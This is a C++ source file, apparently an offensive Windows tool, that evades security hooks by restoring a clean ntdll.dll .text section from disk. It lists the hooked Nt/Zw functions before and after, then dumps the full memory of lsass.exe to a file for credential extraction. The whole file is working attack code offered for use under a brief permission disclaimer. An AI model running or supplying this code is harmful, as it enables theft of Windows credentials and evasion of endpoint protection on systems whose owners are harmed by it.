/*
Created by deranged0tter
For use only in environments that you own or have explicit permission to use this tool in.
I am not liable for any misuse of this software.
USE AT YOUR OWN RISK
*/

#pragma comment (lib, "dbghelp.lib")

#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <iostream>
#include <Dbghelp.h>
using namespace std;

#define ok(msg, ...) printf("\033[0;32m[+]\033[0;37m " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("\033[0;34m[*]\033[0;37m " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("\033[0;31m[-]\033[0;37m " msg "\n", ##__VA_ARGS__)

// unhook ntdll file
BOOL unhookNTDLL() {
	HANDLE hProcess = GetCurrentProcess();
	MODULEINFO miModInfo = {};
	HMODULE hmNtdllModule = GetModuleHandle(L"ntdll.dll");

	GetModuleInformation(hProcess, hmNtdllModule, &miModInfo, sizeof(miModInfo));

	LPVOID ntdllBase = (LPVOID)miModInfo.lpBaseOfDll;
	HANDLE hNtdllFile = CreateFileA("C:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE hNtdllMapping = CreateFileMapping(hNtdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAdr = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAdr + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(hProcess);
	CloseHandle(hNtdllFile);
	CloseHandle(hNtdllMapping);
	FreeLibrary(hmNtdllModule);

	return TRUE;
}

BOOL getHooks() {
	/*
	   CHECK FOR HOOKS
   */
	HMODULE hLibBase = NULL;
	PDWORD pdwFuncAdr = (PDWORD)0;

	// get ntdll base address
	hLibBase = LoadLibraryA("ntdll");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hLibBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hLibBase + dosHeader->e_lfanew);

	// Locate XportAdr Table
	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hLibBase + exportDirectoryRVA);

	// Offsets to list of exported functions and their names
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)hLibBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)hLibBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hLibBase + imageExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++) {
		// Resolve exported function name
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)hLibBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;

		// Resolve exported function address
		DWORD_PTR pdwFuncAdrRVA = 0;
		pdwFuncAdrRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
		pdwFuncAdr = (PDWORD)((DWORD_PTR)hLibBase + pdwFuncAdrRVA);

		// Syscall stubs start with these bytes
		unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };

		// Only interested in Nt|Zw functions
		if (strncmp(functionName, (char*)"Nt", 2) == 0 || strncmp(functionName, (char*)"Zw", 2) == 0)
		{
			// check for false positives
			if ((strncmp(functionName, (char*)"NtQuerySystemTime", 18) != 0) && (strncmp(functionName, (char*)"ZwQuerySystemTime", 18) != 0) && (strncmp(functionName, (char*)"NtGetTickCount", 15) != 0) && (strncmp(functionName, (char*)"ZwQuerySystemTime", 18) != 0) && (strncmp(functionName, (char*)"NtdllDefWindowProc_A", 21) != 0) && (strncmp(functionName, (char*)"NtdllDefWindowProc_W", 21) != 0) && (strncmp(functionName, (char*)"NtdllDialogWndProc_A", 21) != 0) && (strncmp(functionName, (char*)"NtdllDialogWndProc_W", 21) != 0)) {
				// Check if the first 4 instructions of the exported function are the same as the sycall's prologue
				if (memcmp(pdwFuncAdr, syscallPrologue, 4) != 0) {
					if (*((unsigned char*)pdwFuncAdr) == 0xE9) // first byte is a jmp instruction, where does it jump to?
					{
						DWORD jumpTargetRelative = *((PDWORD)((char*)pdwFuncAdr + 1));
						PDWORD jumpTarget = pdwFuncAdr + 5 /*Instruction pointer after our jmp instruction*/ + jumpTargetRelative;
						char moduleNameBuffer[512];
						GetMappedFileNameA(GetCurrentProcess(), jumpTarget, moduleNameBuffer, 512);

						info("Hooked %s : %p into module %s", functionName, pdwFuncAdr, moduleNameBuffer);
					}
					else
					{
						info("Potentially hooked: %s : %p\n", functionName, pdwFuncAdr);
					}
				}
			}
		}
	}

	return TRUE;
}

BOOL dump(IN DWORD LsassPID) {
	HANDLE hLsass = NULL;

	// create handle on outfile
	HANDLE hOutFile = CreateFile(L"drngdDmpr.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	ok("created handle for outfile");
	info("handle 0x%p", hOutFile);

	// get the lsass PID
	hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsassPID);
	if (hLsass == NULL) {
		warn("failed to open handle on lsass");

		CloseHandle(hOutFile);

		return FALSE;
	}
	ok("got handle on lsass (%ld)", LsassPID);
	info("handle: 0x%p", hLsass);

	// create a dump of lsass
	BOOL bIsDumped = MiniDumpWriteDump(hLsass, LsassPID, hOutFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (bIsDumped) {
		ok("successfully dumped lsass to drngdDmpr.dmp");
	}
	else {
		warn("failed to dump lsass, error %ld", GetLastError());
		CloseHandle(hLsass);
		CloseHandle(hOutFile);

		return FALSE;
	}

	CloseHandle(hLsass);
	CloseHandle(hOutFile);

	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		warn("usage: drngdDmpr.exe <lsass.exe pid>");
	}

	DWORD dwLsassPID = NULL;
	dwLsassPID = atoi(argv[1]);

	// unhook api hooks
	info("before unhooking:");
	getHooks();
	BOOL bIsUnhooked = unhookNTDLL();
	if (bIsUnhooked != TRUE) {
		warn("dont know how this shit broke");
		return EXIT_FAILURE;
	}
	ok("successfully unhooked ntdll");
	info("after unhooking:");
	getHooks();
	
	

	BOOL bIsDumped = dump(dwLsassPID);

	return EXIT_SUCCESS;
}